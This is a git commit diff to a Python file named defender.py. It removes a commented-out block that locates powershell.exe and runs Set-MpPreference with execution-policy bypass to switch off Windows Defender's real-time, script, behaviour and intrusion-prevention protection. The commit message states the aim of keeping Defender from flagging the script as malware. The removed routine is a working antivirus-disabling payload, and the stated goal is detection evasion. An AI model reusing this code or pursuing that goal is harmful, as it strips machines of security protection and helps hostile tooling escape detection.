3dbf26f4c22977c6dde610a7f93b76b44c5fb8c4
Sem Botter <33375849+SemBotter@users.noreply.github.com>
2025-03-20 01:35:08 +0100

    Removed old code commented out, defender should no longer detect this script as malware

--- src/defender.py
+++ src/defender.py
@@ -1,49 +1,6 @@
 import subprocess
 import os
 import sys
-"""
-print("Defender disablage!")
-
-def preliminaryCheck(iter: int | None = 0) -> str:
-    if iter == 0:
-        os.chdir("C:\\Windows\\System32")
-        _ = os.listdir()
-        for i in _:
-            if i == "powershell.exe":
-                return os.path.join(os.getcwd(), i)
-        return -1
-    elif iter == 1:
-        os.chdir("C:\\Windows\\System32\\WindowsPowerShell\\v1.0")
-        _ = os.listdir()
-        for i in _:
-            if i == "powershell.exe":
-                return os.path.join(os.getcwd(), i)
-        return -2
-
-for i in range(0, 2):
-    try:
-        testvar = preliminaryCheck(i)
-    except Exception as e:
-        print(f"Warning: {e}")
-    if testvar == -1:
-        continue
-    if testvar == -2:
-        raise SystemExit("No PowerShell has been found!")
-    
-    # Construct the PowerShell command
-    command = f"{testvar} -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true\""
-    
-    # Execute the PowerShell command
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    
-    # Print the output and error (if any)
-    print("Output:", result.stdout)
-    print("Error:", result.stderr)
-    
-    break  # Exit the loop once the command is executed successfully
-print("Defender disabledage!")
-
-"""
 
 directory = os.listdir()
 if "downloads" not in directory:
